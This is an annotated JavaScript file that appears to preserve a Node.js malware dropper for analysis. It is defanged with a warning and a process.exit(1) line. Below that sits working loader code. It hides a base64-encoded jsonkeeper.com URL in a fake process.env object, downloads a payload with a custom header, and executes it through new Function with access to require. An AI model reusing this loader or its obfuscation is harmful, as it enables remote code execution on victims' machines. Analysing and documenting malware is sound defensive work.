// !!!DO NOT EXECUTE THIS CODE UNDER ANY CIRCUMSTANCES!!!
// This is malicious code that downloads and executes remote JavaScript

// Safeguard added to prevent execution
process.exit(1);

// Original malware code below with explanatory comments:
"use strict";

// Import HTTP client for downloading remote code
const axios = require("axios");

// Fake process.env object to disguise malicious configuration as environment variables
// These are base64 encoded values to obfuscate the real URLs and headers
const process = {
  env: {
    // Base64: "https://jsonkeeper.com/b/JPDB4" - URL to fetch malicious code from
    DEV_API_KEY: "aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iL0pQREI0",
    // Base64: "x-secret-key" - HTTP header name for authentication
    DEV_SECRET_KEY: "eC1zZWNyZXQta2V5",
    // Base64: "_" - HTTP header value (likely a simple token)
    DEV_SECRET_VALUE: "Xw==",
  }
};

// Self-executing async function that acts as a code dropper/loader
(async function getCallers(..._args) {
  // Decode base64 strings to reveal actual values
  const src = atob(process.env.DEV_API_KEY);     // Decodes to: "https://jsonkeeper.com/b/JPDB4"
  const k = atob(process.env.DEV_SECRET_KEY);     // Decodes to: "x-secret-key"
  const v = atob(process.env.DEV_SECRET_VALUE);   // Decodes to: "_"

  let retrycnt = 5; // Retry counter for downloading malicious payload
  
  // Retry loop - attempts to download and execute remote code up to 5 times
  while (retrycnt > 0) {
    try {
      // Backup original console.log function to restore later
      // The downloaded code probably replaces console.log with a no-op function - eg: console.log = () => {};
      // or redirects it - eg: console.log = (msg) => { /* send to remote server or ignore */ };
      const l = console.log;
      
      // Download JavaScript code from remote server using custom header for authentication
      // The response is expected to have a 'cookie' property containing executable JavaScript
      const s = (await axios.get(src, { headers: { [k]: v } })).data.cookie;
      
      // DANGEROUS: Create a new function from the downloaded string and execute it
      // This allows arbitrary code execution from the remote server
      const handler = new Function.constructor("require", s);
      handler(require); // Execute the downloaded code with access to Node.js require function
      
      // Restore original console.log function
      console.log = l;
      break; // Exit loop if successful
    }
    catch (error) {
      retrycnt--; // Decrement retry counter on failure and try again
    }
  }
})();